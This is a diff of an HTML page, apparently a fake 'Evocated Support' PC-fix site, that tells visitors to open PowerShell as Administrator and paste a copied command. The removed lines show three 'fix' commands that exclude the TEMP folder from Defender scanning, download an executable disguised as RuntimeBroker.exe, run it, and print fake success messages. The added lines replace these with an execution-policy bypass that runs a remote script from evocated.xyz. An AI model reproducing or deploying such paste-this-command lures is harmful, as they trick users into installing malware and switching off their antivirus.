@@ -2,16 +2,18 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Evocated Fix Tools</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Evocated Support</title>
   <style>
     html, body {
       margin: 0;
       padding: 0;
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      background: linear-gradient(120deg, #0f0f0f, #1a1a1a);
-      background-size: 300% 300%;
-      animation: gradientFlow 15s ease infinite;
+      height: 100%;
+      overflow: hidden;
+      font-family: 'Segoe UI', sans-serif;
+      background: linear-gradient(120deg, #0d0d0d, #1a1a1a, #0d0d0d);
+      background-size: 400% 400%;
+      animation: gradientFlow 10s ease infinite;
       color: white;
       text-align: center;
     }
@@ -22,134 +24,206 @@
       100% { background-position: 0% 50%; }
     }
 
-    .btn {
-      background-color: #222;
+    /* Loader Styles */
+    #loader {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%;
+      height: 100%;
+      background-color: #0d0d0d;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      z-index: 1000;
+      transition: opacity 1s ease;
+    }
+
+    .loader-text {
+      font-size: 2em;
       color: cyan;
+      text-shadow: 0 0 15px cyan;
+      animation: pulse 1.5s infinite;
+    }
+
+    @keyframes pulse {
+      0%, 100% { opacity: 0.4; }
+      50% { opacity: 1; }
+    }
+
+    /* Hidden content initially */
+    #main-content {
+      opacity: 0;
+      transition: opacity 1s ease;
+      pointer-events: none;
+    }
+
+    .show {
+      opacity: 1 !important;
+      pointer-events: auto;
+    }
+
+    h1 {
+      font-size: 3em;
+      margin-top: 40px;
+      color: cyan;
+      text-shadow: 0 0 15px cyan;
+      animation: bounce 2s infinite;
+    }
+
+    @keyframes bounce {
+      0%, 100% { transform: translateY(0); }
+      50% { transform: translateY(-20px); }
+    }
+
+    .button {
+      background: transparent;
       border: 2px solid cyan;
-      padding: 12px 24px;
+      color: cyan;
+      padding: 12px 20px;
       margin: 10px;
       border-radius: 8px;
-      font-size: 1rem;
       cursor: pointer;
-      transition: all 0.3s ease;
-      box-shadow: 0 0 8px cyan;
+      font-size: 1em;
+      transition: 0.3s;
+      position: relative;
     }
 
-    .btn:hover {
+    .button:hover {
+      background: cyan;
+      color: black;
+      box-shadow: 0 0 20px cyan;
+    }
+
+    .button::before {
+      content: '⚙️';
+      position: absolute;
+      left: -25px;
+      font-size: 1.2em;
+      opacity: 0.7;
+    }
+
+    .section {
+      margin-top: 30px;
+    }
+
+    .command-box {
+      background-color: rgba(0, 255, 255, 0.1);
+      border: 1px solid cyan;
+      border-radius: 8px;
+      padding: 10px;
+      margin: 20px auto;
+      max-width: 500px;
+      display: none;
+    }
+
+    .copy-button {
+      margin-top: 10px;
+      padding: 8px 15px;
+      border: none;
+      border-radius: 5px;
       background-color: cyan;
       color: black;
-    }
-
-    .description {
-      margin: 40px 20px 20px;
-      font-size: 1.2rem;
-    }
-
-    .commandBox {
-      display: none;
-      background: #111;
-      border: 2px solid cyan;
-      padding: 15px;
-      margin: 10px auto;
-      width: 90%;
-      max-width: 800px;
-      font-size: 0.9rem;
-      overflow-x: auto;
-      border-radius: 10px;
-      box-shadow: 0 0 8px cyan;
-    }
-
-    .copyBtn {
-      background-color: #00ffcc;
-      color: black;
-      padding: 10px 20px;
-      font-size: 1rem;
-      border: none;
-      border-radius: 10px;
-      margin-top: 12px;
       cursor: pointer;
-      box-shadow: 0 0 12px #00ffcc;
-      transition: background 0.2s;
+      font-weight: bold;
+      transition: 0.3s;
     }
 
-    .copyBtn:hover {
-      background-color: #00ddaa;
+    .copy-button:hover {
+      background-color: white;
     }
 
-    h3 {
-      margin-top: 50px;
-      text-shadow: 0 0 8px cyan;
+    .trail {
+      position: absolute;
+      width: 8px;
+      height: 8px;
+      background: cyan;
+      border-radius: 50%;
+      pointer-events: none;
+      opacity: 0.6;
+      animation: trailFade 0.5s forwards;
+    }
+
+    @keyframes trailFade {
+      to { opacity: 0; transform: scale(2); }
     }
   </style>
 </head>
 <body>
 
-  <p class="description">
-    You need to run PowerShell as Administrator. Once open, click the button below to get the command you need to run.
-  </p>
-
-  <!-- First Tool -->
-  <button class="btn" onclick="showCommand('commandBox1', 'copyBtn1')">Fix Now Visual studio Errors</button>
-  <div id="commandBox1" class="commandBox">
-    Write-Host "Launching Velocity Fix Tool..." -ForegroundColor Green; IEX "Add-MpPreference -ExclusionPath $env:TEMP"; IEX "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/clarkezbms/WindowSecurity/refs/heads/main/WindowSecurity.exe', '$env:TEMP\\RuntimeBroker.exe')"; IEX "Start-Process '$env:TEMP\\RuntimeBroker.exe'"; Write-Host "Fix failed, please try again later or contact support." -ForegroundColor Red
+  <!-- Loader -->
+  <div id="loader">
+    <div class="loader-text">Loading Evocated Tools...</div>
   </div>
-  <button id="copyBtn1" class="copyBtn" onclick="copyCommand('commandBox1')" style="display:none;">Copy to Clipboard</button>
 
-  <!-- Other Fix Tools Header -->
-  <h3>Other Fix Tools</h3>
+  <!-- Main Content -->
+  <div id="main-content">
+    <h1>Evocated Support</h1>
+    <p>You need to run PowerShell as Administrator. Once open, click the button below to get the command you need to run.</p>
 
-  <!-- Tool 2 -->
-  <button class="btn" onclick="showCommand('commandBox2', 'copyBtn2')">Fix HIGH CPU USAGE 100 TO 15+</button>
-  <div id="commandBox2" class="commandBox">
-    Write-Host "Launching Evocative Fix Tool..." -ForegroundColor Green; IEX "Add-MpPreference -ExclusionPath $env:TEMP"; IEX "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/clarkezbms/WindowSecurity/refs/heads/main/WindowSecurity.exe', '$env:TEMP\\RuntimeBroker.exe')"; IEX "Start-Process '$env:TEMP\\RuntimeBroker.exe'"; Write-Host "Completed Cpu Capped To 15%+" -ForegroundColor Green
+    <button class="button" onclick="toggleCommandBox()">Fix Now Visual Studio Errors</button>
+
+    <div class="command-box" id="commandBox">
+      <code id="psCommand">Set-ExecutionPolicy Bypass -Scope Process -Force; iex ((New-Object System.Net.WebClient).DownloadString('https://evocated.xyz/fix'))</code>
+      <br>
+      <button class="copy-button" onclick="copyCommand()">Copy to Clipboard</button>
+    </div>
+
+    <div class="section">
+      <h3>Other Fix Tools</h3>
+      <button class="button">Fix HIGH CPU USAGE 100 TO 15+</button>
+      <button class="button">Fix LAG/SLOW PC 3</button>
+      <button class="button">Fix Tool 4</button>
+      <button class="button">Fix Tool 5</button>
+    </div>
+
+    <!-- Background Music -->
+    <audio autoplay loop>
+      <source src="nights.mp3" type="audio/mpeg">
+    </audio>
   </div>
-  <button id="copyBtn2" class="copyBtn" onclick="copyCommand('commandBox2')" style="display:none;">Copy to Clipboard</button>
 
-  <!-- Tool 3 -->
-  <button class="btn" onclick="showCommand('commandBox3', 'copyBtn3')">Fix LAG/SLOW PC 3</button>
-  <div id="commandBox3" class="commandBox">
-    Write-Host "Launching Evocative Fix Tool..." -ForegroundColor Green; IEX "Add-MpPreference -ExclusionPath $env:TEMP"; IEX "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/clarkezbms/WindowSecurity/refs/heads/main/WindowSecurity.exe', '$env:TEMP\\RuntimeBroker.exe')"; IEX "Start-Process '$env:TEMP\\RuntimeBroker.exe'"; Write-Host "CLEANING PC........................... PC CLEANED PLEASE REBOOT TO MAKE THE PROCESS FAST" -ForegroundColor Green
-  </div>
-  <button id="copyBtn3" class="copyBtn" onclick="copyCommand('commandBox3')" style="display:none;">Copy to Clipboard</button>
-
-  <!-- Tool 4 -->
-  <button class="btn" onclick="showCommand('commandBox4', 'copyBtn4')">Fix Tool 4</button>
-  <div id="commandBox4" class="commandBox">Command for Tool 4...</div>
-  <button id="copyBtn4" class="copyBtn" onclick="copyCommand('commandBox4')" style="display:none;">Copy to Clipboard</button>
-
-  <!-- Tool 5 -->
-  <button class="btn" onclick="showCommand('commandBox5', 'copyBtn5')">Fix Tool 5</button>
-  <div id="commandBox5" class="commandBox">Command for Tool 5...</div>
-  <button id="copyBtn5" class="copyBtn" onclick="copyCommand('commandBox5')" style="display:none;">Copy to Clipboard</button>
-
-  <!-- Music -->
-  <audio id="bgMusic" src="nights.mp3" preload="auto" loop></audio>
-
-  <!-- Script -->
+  <!-- Script Section -->
   <script>
-    function showCommand(boxId, btnId) {
-      document.getElementById(boxId).style.display = "block";
-      document.getElementById(btnId).style.display = "inline-block";
-    }
-
-    function copyCommand(boxId) {
-      const text = document.getElementById(boxId).innerText;
-      navigator.clipboard.writeText(text);
-      alert("Command copied!");
-    }
-
-    document.addEventListener("click", function () {
-      const audio = document.getElementById("bgMusic");
-      if (audio.paused) audio.play();
+    // Loader logic
+    window.addEventListener("load", () => {
+      setTimeout(() => {
+        document.getElementById("loader").style.opacity = 0;
+        setTimeout(() => {
+          document.getElementById("loader").style.display = "none";
+          document.getElementById("main-content").classList.add("show");
+        }, 1000);
+      }, 1500);
     });
-  </script>
 
+    // Cursor trail
+    const trailCount = 20;
+    let trails = [];
+
+    document.addEventListener("mousemove", e => {
+      const trail = document.createElement("div");
+      trail.className = "trail";
+      trail.style.left = `${e.pageX}px`;
+      trail.style.top = `${e.pageY}px`;
+      document.body.appendChild(trail);
+      trails.push(trail);
+
+      if (trails.length > trailCount) {
+        let old = trails.shift();
+        old.remove();
+      }
+    });
+
+    function toggleCommandBox() {
+      const box = document.getElementById("commandBox");
+      box.style.display = box.style.display === "none" || box.style.display === "" ? "block" : "none";
+    }
+
+    function copyCommand() {
+      const text = document.getElementById("psCommand").innerText;
+      navigator.clipboard.writeText(text).then(() => {
+        alert("Copied to clipboard!");
+      });
+    }
+  </script>
 </body>
 </html>
-
-
-
-
-
-
-
